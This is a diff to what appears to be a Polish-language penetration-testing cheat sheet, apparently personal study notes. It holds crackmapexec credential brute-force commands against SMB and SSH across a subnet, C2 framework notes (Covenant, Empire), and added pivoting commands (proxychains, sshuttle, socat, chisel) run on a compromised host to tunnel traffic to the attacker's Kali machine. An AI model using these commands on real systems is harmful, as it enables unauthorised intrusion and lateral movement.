@@ -19,7 +19,10 @@ crackmapex smb ip -u user.txt -p pass.txt  --continue-on-success | grep '[+] bru
 crackmapexec ip/24  -u user.txt -p pass.txt  --continue-on-success | grep '[+]   szuka po calej sieci
 crackmapexec ssh    to samo tylko ssh
 
-C2
+
+
+
+C2   DOWODZENIE I KONTROLA/COMMAND AND CONTROL
 COVENANT
 EMPIRE:jest to platforma dopost-eksploatacji, która ejst używana jako pomoc dla red teamu i testów penetracyjnych. Agenci: PowerShell Python 3 C# IronPython 3
 Różne mechanizmy C2, takie jak OneDrive, Dropbox, php, http/s i profile Malleable. 
@@ -105,6 +108,30 @@ SEATBELT: to projekt w języku C#, który przeprowadza szereg zorientowanych na 
 istotnych zarówno z ofensywnych, jak i defensywnych perspektyw bezpieczeństwa.
 
 
+
+OBRACANIE/PIVOTING:
+PROXYCHAINS:
+ProxyChains to narzędzie, które przekierowuje połączenia TCP nawiązywane przez aplikacje za pośrednictwem różnych serwerów proxy, takich jak SOCKS4, SOCKS5 lub HTTP
+np.:  proxychains nc ip 4455      musimy zmienic konfiguracje  proxychains.conf  socks5 4455
+Możem dodac do FoxyProxy    socks5 localhost  5555   mozemy polaczyc sie ze strona z poza trzeba dodac jeszcze inne narzedzie do tunelowania.
+
+SSHUTTLE: tunelowanie ssh
+sshuttle  -r root@ipZaatakwoanejMaszyny ipSieciwewDoSkanowaniaNaKoncu0/24
+sshuttle -r root@ipZaatakwoanejMaszyny --ssh-cmd "ssh -i id" ipSieciwewDoSkanowaniaNaKoncu0/24     za pomoca klucza id_rsa
+
+SOCAT
+socat tcp-l:4444 tcp:ipNaszegoKali:4455  wlaczamy na zhakowanej maszynie keirujemy ruch z 4444 do nas do 4455      
+Warto odblokwoac port na firewallu :   firewall-cmd --zone=public --add-port 4455/tcp  i 4444
+
+CHISEL:
+Na zaatakwoanej maszynie
+chisel server -p 4444 --socks5
+łączymy sie z naszego KALI:
+chisel client ipZaatakwoanejMaszyny:4444 4455:socks
+łączymy sie z naszego KALI:
+
+Po tym Możemy uzyc proxychains przez port  4455
+ 
 
 
 
